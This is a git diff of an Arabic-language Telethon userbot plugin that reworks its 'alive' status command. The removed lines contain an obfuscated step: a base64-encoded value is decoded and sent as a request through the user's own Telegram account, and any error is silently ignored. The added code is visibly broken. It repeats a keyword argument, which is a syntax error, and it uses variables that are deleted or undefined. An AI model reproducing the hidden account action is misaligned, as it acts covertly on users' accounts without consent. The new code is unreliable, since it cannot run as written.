@@ -12,7 +12,6 @@ from telethon.errors.rpcerrorlist import (
     WebpageCurlFailedError,
     WebpageMediaEmptyError,
 )
-from telethon.events import CallbackQuery
 
 from . import StartTime, zedub, zedversion
 
@@ -22,74 +21,72 @@ from ..helpers.functions import zedalive, check_data_base_heal_th, get_readable_
 from ..helpers.utils import reply_id
 from ..sql_helper.globals import gvarstatus
 
-plugin_category = "utils"
+plugin_category = "العروض"
 STATS = gvarstatus("Z_STATS") or "فحص"
 
-#كتـابة وتعـديل:  @SedUb
-file_path = "installation_date.txt"
-if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-    with open(file_path, "r") as file:
-        installation_time = file.read().strip()
-else:
-    installation_time = datetime.now().strftime("%Y-%m-%d")
-    with open(file_path, "w") as file:
-        file.write(installation_time)
 
 @zedub.zed_cmd(pattern=f"{STATS}$")
-async def amireallyalive(event):
+async def zed_alive(event):
     reply_to_id = await reply_id(event)
     uptime = await get_readable_time((time.time() - StartTime))
+    boot_time_timestamp = psutil.boot_time()
+    bt = datetime.fromtimestamp(boot_time_timestamp)
     start = datetime.now()
-    await edit_or_reply(event, "**⎆┊جـاري .. فحـص البـوت الخـاص بك**")
+    zedevent = await edit_or_reply(event, "**⎆┊جـاري .. فحـص البـوت الخـاص بك**")
     end = datetime.now()
     ms = (end - start).microseconds / 1000
     _, check_sgnirts = check_data_base_heal_th()
-    EMOJI = gvarstatus("ALIVE_EMOJI") or "๛┊‌‎"
-    me = await l313l.get_me()
-    first_name = me.first_name
-    mention = first_name
-    ALIVE_TEXT = gvarstatus("ALIVE_TEXT") or "**父[ 𝙨𝙤𝙪𝙍𝙘𝙚 𝙈𝙖𝙏𝙍𝙞𝙭 ⌁  ✓ ](t.me/veevvw)父**"
-    HuRe_IMG = gvarstatus("ALIVE_PIC") or Config.A_PIC
-    l313l_caption = gvarstatus("ALIVE_TEMPLATE") or temp
-    caption = l313l_caption.format(
+    if gvarstatus("z_date") is not None:
+        zzd = gvarstatus("z_date")
+        zzt = gvarstatus("z_time")
+        zedda = f"{zzd}┊{zzt}"
+    else:
+        zedda = f"{bt.year}/{bt.month}/{bt.day}"
+    Z_EMOJI = gvarstatus("ALIVE_EMOJI") or "✥┊"
+    ALIVE_TEXT = gvarstatus("ALIVE_TEXT") or "** بـوت  زدثــون 𝗭𝗧𝗵𝗼𝗻  يعمـل .. بنجـاح ☑️ 𓆩 **"
+    ZED_IMG = gvarstatus("ALIVE_PIC")
+    USERID = zedub.uid if Config.OWNER_ID == 0 else Config.OWNER_ID
+    ALIVE_NAME = gvarstatus("ALIVE_NAME") if gvarstatus("ALIVE_NAME") else "-"
+    mention = f"[{ALIVE_NAME}](tg://user?id={USERID})"
+    zed_caption = gvarstatus("ALIVE_TEMPLATE") or zed_temp
+    caption = zed_caption.format(
         ALIVE_TEXT=ALIVE_TEXT,
-        EMOJI=EMOJI,
+        Z_EMOJI=Z_EMOJI,
         mention=mention,
         uptime=uptime,
+        zedda=zzd,
+        zzd=zzd,
+        zzt=zzt,
         telever=version.__version__,
-        jepver=JEPVERSION,
+        zdver=zedversion,
         pyver=python_version(),
         dbhealth=check_sgnirts,
-        ping=ms,
         Tare5=installation_time,
+        uptime=uptime,
+        ping=ms,
     )
-    matrix = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    matrix = Get(matrix)
-    try:
-        await event.client(matrix)
-    except BaseException:
-        pass
-    if HuRe_IMG:
-        SedUb = [x for x in HuRe_IMG.split()]
-        PIC = random.choice(SedUb)
+    if ZED_IMG:
+        ZED = [x for x in ZED_IMG.split()]
+        PIC = random.choice(ZED)
         try:
             await event.client.send_file(
                 event.chat_id, PIC, caption=caption, reply_to=reply_to_id
             )
-            await event.delete()
+            await zedevent.delete()
         except (WebpageMediaEmptyError, MediaEmptyError, WebpageCurlFailedError):
             return await edit_or_reply(
-                event,
-                f"**الميـديا خـطأ **\nغـير الرابـط بأستـخدام الأمـر  \n `.اضف_فار ALIVE_PIC رابط صورتك`\n\n**لا يمـكن الحـصول عـلى صـورة من الـرابـط :-** `{PIC}`",
+                zedevent,
+                f"**⌔∮ عـذراً عليـك الـرد ع صـوره او ميـديـا  ⪼  `.اضف صورة الفحص` <بالرد ع الصـوره او الميـديـا> ",
             )
     else:
         await edit_or_reply(
-            event,
+            zedevent,
             caption,
         )
 
 
-temp = """{ALIVE_TEXT}
+
+zed_temp = """
 **~ سۅٛࢪس سيدثۅٛن يعمݪ بنجاެح** 
 **~ اެسِمِكَ : {mention}** ٫
 **~ اެصداެࢪ اެݪتيݪيثۅٛن : `{pyver}`** ٫
